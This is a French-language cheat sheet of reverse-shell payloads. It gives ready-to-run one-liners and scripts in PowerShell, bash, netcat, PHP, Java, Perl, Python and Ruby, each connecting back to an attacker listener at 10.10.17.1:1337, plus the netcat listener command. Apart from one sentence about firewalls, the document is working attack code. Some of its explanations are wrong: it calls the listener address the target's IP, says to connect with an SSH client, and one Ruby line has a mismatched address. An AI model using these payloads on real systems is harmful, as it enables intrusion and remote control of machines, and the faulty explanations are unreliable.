Un shell inversé ou "reverse shell" est un script ou un programme exécutable qui permet un accès shell interactif à un système via une connexion sortante de ce système

Les pirates malveillants utilisent souvent des shells inversés pour envoyer des commandes à un système compromis, et ils peuvent être utilisés à des fins légitimes, telles que l'administration de serveur distant

# Windows Power Shell
Pour les systèmes Windows, un shell inversé peut être créé à l'aide de PowerShell

Exemple de shell PowerShell inversé :
```
$sm=(New-Object Net.Sockets.TCPClient("10.10.17.1",1337)).GetStream();
[byte[]]$bt=0..255|%{0};
while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);
$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));
$sm.Write($st,0,$st.Length)}
```

Ce script établit une connexion shell inverse de la machine cible à la machine de l'attaquant, qui écoute sur le port TCP 1337. L'adresse IP de la machine cible est "10.10.17.1" dans cet exemple

Vous n'avez plus qu'à vous connecter via un client SSH

## Alternative avec HTA
Une autre méthode consiste à utiliser des fichiers HTA avec PowerShell intégré. Par exemple, un shell inversé peut être intégré dans un fichier HTA et exécuté à l'aide de `mshta.exe`

Pour empêcher l'utilisation inverse du shell, vous pouvez imposer un contrôle strict sur les connexions sortantes à l'aide d'un pare-feu et vous assurer que toute activité suspecte est surveillée de près

# Linux bash
Pour envoyer des commandes à un shell inversé sur Linux, vous devez établir un listener sur votre machine locale, puis vous connecter au shell inverse sur la machine cible. 

Voici un exemple de base en utilisant Netcat:
## Établissez un Listener
- Sur votre machine locale, démarrez un listener Netcat pour recevoir la connexion shell inversée : `nc -l -p 1337`
  - Cette commande écoute les connexions entrantes sur le port 1337.

## Envoyer des commandes
- Une fois le shell inversé connecté, vous pouvez envoyer des commandes comme vous le feriez dans une session shell normale
- Pour un shell Bash inversé, vous pouvez utiliser : `bash -i >& /dev/tcp/your_ip/your_port 0>&1`
  - Une fois que le shell inverse se connecte, vous pouvez envoyer des commandes directement au shell
Par exemple, pour vérifier l'utilisateur actuel, vous pouvez taper : `whoami`

# Autres reverse shell
[invicti.com/learn/reverse-shell](https://www.invicti.com/learn/reverse-shell/)
## NetCat
- `ncat -l -p 1337`
- ou `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.17.1 1337 >/tmp/f`
## PHP
`php -r '$sock=fsockopen("10.10.17.1",1337);exec("/bin/sh -i <&3 >&3 2>&3");'`
## Java
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.17.1/1337;
cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## PERL
```
perl -e 'use Socket;$i="10.10.17.1";$p=1337;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");
open(STDOUT,">&S");open(STDERR,">&S");
exec("/bin/sh -i");};'
```
### Python
```
python -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.17.1",1337));
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'
```
## RUBY
```
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.17.1","1337");
while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end';
```
ou
```
ruby -rsocket -e'f=TCPSocket.open("10.0.17.1",1337).to_i;
exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
